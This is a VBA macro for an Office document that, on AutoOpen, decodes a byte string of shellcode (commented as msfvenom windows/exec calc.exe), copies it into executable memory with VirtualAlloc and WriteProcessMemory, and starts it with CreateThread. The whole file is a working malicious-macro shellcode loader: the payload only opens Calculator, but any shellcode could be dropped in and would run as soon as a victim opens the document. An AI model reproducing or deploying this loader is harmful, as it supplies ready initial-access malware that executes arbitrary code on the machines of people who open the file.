Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal lpBuffer As String, ByVal dwSize As Long, ByRef lpNumberOfBytesWritten As Long) As Integer
Private Declare Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long

Const MEM_COMMIT = &H1000
Const PAGE_EXECUTE_READWRITE = &H40

Sub AutoOpen()
ExecuteShellCode
End Sub

Private Sub ExecuteShellCode()
    Dim lpMemory As Long
    Dim sShellCode As String
    Dim lResult As Long

    sShellCode = ShellCode()
    lpMemory = VirtualAlloc(0&, Len(sShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    lResult = WriteProcessMemory(-1&, lpMemory, sShellCode, Len(sShellCode), 0&)
    lResult = CreateThread(0&, 0&, lpMemory, 0&, 0&, 0&)
End Sub

Private Function ParseBytes(strBytes) As String
    Dim aNumbers
    Dim sShellCode As String
    Dim iIter

    sShellCode = ""
    aNumbers = Split(strBytes)
    For iIter = LBound(aNumbers) To UBound(aNumbers)
        sShellCode = sShellCode + Chr(aNumbers(iIter))
    Next

    ParseBytes = sShellCode
End Function

Private Function ShellCode1() As String
    Dim sShellCode As String
    ' x86 msfvenom windows/exec cmd="calc.exe"
    sShellCode = ""
    sShellCode = sShellCode + ParseBytes("252 232 130 0 0 0 96 137 229 49 192 100 139 80 48 139 82 12 139 82 20 139 114 40 15")
    sShellCode = sShellCode + ParseBytes("183 74 38 49 255 172 60 97 124 2 44 32 193 207 13 1 199 226 242 82 87 139 82 16 139")
    sShellCode = sShellCode + ParseBytes("74 60 139 76 17 120 227 72 1 209 81 139 89 32 1 211 139 73 24 227 58 73 139 52 139")
    sShellCode = sShellCode + ParseBytes("1 214 49 255 172 193 207 13 1 199 56 224 117 246 3 125 248 59 125 36 117 228 88 139")
    sShellCode = sShellCode + ParseBytes("88 36 1 211 102 139 12 75 139 88 28 1 211 139 4 139 1 208 137 68 36 36 91 91 97 89")
    sShellCode = sShellCode + ParseBytes("90 81 255 224 95 95 90 139 18 235 141 93 106 1 141 133 178 0 0 0 80 104 49 139 111")
    sShellCode = sShellCode + ParseBytes("135 255 213 187 240 181 162 86 104 166 149 189 157 255 213 60 6 124 10 128 251 224")
    sShellCode = sShellCode + ParseBytes("117 5 187 71 19 114 111 106 0 83 255 213 99 97 108 99 46 101 120 101 0")

    ShellCode1 = sShellCode
End Function

Private Function ShellCode() As String
    Dim sShellCode As String

    sShellCode = ""
    sShellCode = sShellCode + ShellCode1()

    ShellCode = sShellCode
End Function


